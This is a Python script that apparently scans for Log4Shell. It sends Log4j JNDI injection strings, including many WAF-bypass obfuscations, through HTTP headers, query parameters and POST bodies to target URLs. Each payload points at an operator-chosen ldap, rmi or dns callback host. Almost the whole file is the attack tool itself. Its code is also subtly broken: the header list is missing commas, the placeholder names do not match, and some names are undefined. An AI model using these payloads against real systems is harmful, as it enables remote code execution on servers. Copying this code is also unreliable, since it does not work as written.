import argparse
import requests
import sys
from urllib import parse as urlparse
import random
from termcolor import cprint


requests.packages.urllib3.disable_warnings()


if len(sys.argv) <= 1:
    print('\n%s -h for help.' % (sys.argv[0]))
    exit(0)

default_headers ={

'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
'Accept': '*/*'

}


post_data_parameters = ["username", "user", "email", "email_address", "password", "c"]
timeout = 4


waf_bypass_payloads = [
            "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
            "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
            "${jndi:rmi://{{callback_host}}}",
            "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
            "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
            "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
            "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}://{{callback_host}}/{{random}}}",
            "${jndi:dns://{{callback_host}}}",

            "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:ldap://{{callback_host}}/{{random}}}",
            "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:LDAP://{{callback_host}}/{{random}}}",
            "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:Ldap://{{callback_host}}/{{random}}}",
            "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:lDap://{{callback_host}}/{{random}}}",
            "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:ldAp://{{callback_host}}/{{random}}}",
            "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:LdaP://{{callback_host}}/{{random}}}",

            "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:rmi://{{callback_host}}/{{random}}}",
            "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:RMI://{{callback_host}}/{{random}}}",
            "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:Rmi://{{callback_host}}/{{random}}}",
            "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:rMi://{{callback_host}}/{{random}}}",
            "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:rmI://{{callback_host}}/{{random}}}",

            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{callback_host}}/{{random}}}",

            "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//{{callback_host}}/{{random}}}",
            "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-r}mi${env:NaN:-:}//{{callback_host}}/{{random}}}",

            "${jndi${nagli:-:}ldap:${::-/}/{{callback_host}}/{{random}}}",
            "${j${k8s:k5:-ND}i${sd:k5:-:}ldap://{{callback_host}}/{{random}}}",
            "${${env:HL:-j}ndi:ldap:${:::::::::-//}{{callback_host}}/{{random}}}",
            "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//{{callback_host}}/{{random}}}",
                       ]

headers = [
    "Referer"
    "X-Api-Version"
    "Accept-Charset"
    "Accept-Datetime"
    "Accept-Encoding"
    "Accept-Language"
    "Cookie"
    "Forwarded"
    "Forwarded-For"
    "Forwarded-For-Ip"
    "Forwarded-Proto"
    "From"
    "TE"
    "True-Client-IP"
    "Upgrade"
    "User-Agent"
    "Via"
    "Warning"
    "X-Api-Version"
    "Max-Forwards"
    "Origin"
    "Pragma"
    "DNT"
    "Cache-Control"
    ""
    "X-Att-Deviceid"
    "X-ATT-DeviceId"
    "X-Correlation-ID"
    "X-Csrf-Token"
    "X-CSRFToken"
    "X-Do-Not-Track"
    "X-Foo"
    "X-Foo-Bar"
    "X-Forwarded"
    "X-Forwarded-By"
    "X-Forwarded-For"
    "X-Forwarded-For-Original"
    "X-Forwarded-Host"
    "X-Forwarded-Port"
    "X-Forwarded-Proto"
    "X-Forwarded-Protocol"
    "X-Forwarded-Scheme"
    "X-Forwarded-Server"
    "X-Forwarded-Ssl"
    "X-Forwarder-For"
    "X-Forward-For"
    "X-Forward-Proto"
    "X-Frame-Options"
    "X-From"
    "X-Geoip-Country"
    "X-Http-Destinationurl"
    "X-Http-Host-Override"
    "X-Http-Method"
    "X-Http-Method-Override"
    "X-HTTP-Method-Override"
    "X-Http-Path-Override"
    "X-Https"
    "X-Htx-Agent"
    "X-Hub-Signature"
    "X-If-Unmodified-Since"
    "X-Imbo-Test-Config"
    "X-Insight"
    "X-Ip"
    "X-Ip-Trail"
    "X-ProxyUser-Ip"
    "X-Requested-With"
    "X-Request-ID"
    "X-UIDH"
    "X-Wap-Profile"
    "X-XSRF-TOKEN"
]

parser =argparse.ArgumentParser()
parser.add_argument("-u","--url",
                    dest="url",
                    help="The target url"
                   )
parser.add_argument("-l", "--list",
                    dest="usedlist",
                    help="Check a list of URLs.",
                    )

parser.add_argument("-p", "--proxy",
                    dest="proxy",
                    help="send requests through proxy",)


parser.add_argument("--ldap-addr",
                    dest="custom_dns_callback_addr",
                    help="Custom DNS Callback Address.",
                    )



parser.add_argument("--request-type",
                    dest="request_type",
                    help="Request Type: (get, post,all) - [Default: get].",
                    default="get",
                    )

args = parser.parse_args()

proxies = {}
if args.proxy:
    proxies = {"http": args.proxy, "https": args.proxy}


def get_fuzzing_headers (payload):
    fuzzing_headers ={}
    fuzzing_headers.update(default_headers)

    for i in headers:
        fuzzing_headers.update({i:payload})

    return fuzzing_headers


def get_fuzzing_post_data (payload):
    fuzzing_post_data={}
    for i in post_data_parameters:
        fuzzing_post_data.update({i:payload})
    return fuzzing_post_data



def generate_waf_bypass_payloads(callback_addr, random_string):
    payloads = []
    for i in waf_bypass_payloads:
        new_payload = i.replace("{{callback_addr}}", callback_addr)
        new_payload = new_payload.replace("{{random}}", random_string)
        payloads.append(new_payload)
    return payloads

def scan_url (url ,callback_addr):
    random_string=''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz')for i in range(7))
    payload = '${jndi:ldap://%s/%s}' % (callback_addr, random_string)
    payloads =[payload]

    payloads.extend(generate_waf_bypass_payloads(f'{callback_addr}', random_string))
    #print(payloads)
    for payload in payloads:
        cprint(f"[•] URL: {url} | PAYLOAD: {payload}")
        if args.request_type.upper() == "GET" or args.request_type.upper == "ALL":
            try:
                requests.request(url=url,
                                 method="GET",
                                 params={"v": payload},
                                 headers=get_fuzzing_headers(payload),
                                 verify=False,
                                 timeout=timeout,
                                 allow_redirects=True,
                                 proxies=proxies)
            except Exception as e:
                cprint(f"EXCEPTION: {e}")




        if args.request_type.upper() == "POST" or args.request_type.upper == "ALL":
            try:
                # Post body
                requests.request(url=url,
                                 method="POST",
                                 params={"v": payload},
                                 headers=get_fuzzing_headers(payload),
                                 data=get_fuzzing_post_data(payload),
                                 verify=False,
                                 timeout=timeout,
                                 allow_redirects=True,
                                 proxies=proxies)
            except Exception as e:
                cprint(f"EXCEPTION: {e}")
            try:
                # JSON body
                requests.request(url=url,
                                 method="POST",
                                 params={"v": payload},
                                 headers=get_fuzzing_headers(payload),
                                 json=json(get_fuzzing_post_data(payload)),
                                 verify=False,
                                 timeout=timeout,
                                 allow_redirects=(not args.disable_redirects),
                                 proxies=proxies)
            except Exception as e:
                cprint(f"EXCEPTION: {e}")
            return random_string




def main():
    urls = []
    vulnerable = 0
    if args.url:
        urls.append(args.url)
    if args.usedlist:
        with open(args.usedlist, "r") as f:
            for i in f.readlines():
                i = i.strip()
                if i == "" or i.startswith("#"):
                    continue
                urls.append(i)

    dns_callback_addr = ""
    cprint(f"[•] Using your DNS service address [{args.custom_dns_callback_addr}].")
    dns_callback_addr = args.custom_dns_callback_addr

    cprint("[%] Checking for Log4j")
    for url in urls:
       cprint(f"[•] URL: {url}")
       scan_url(url, dns_callback_addr)



if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        cprint(f"EXCEPTION: {e}")













































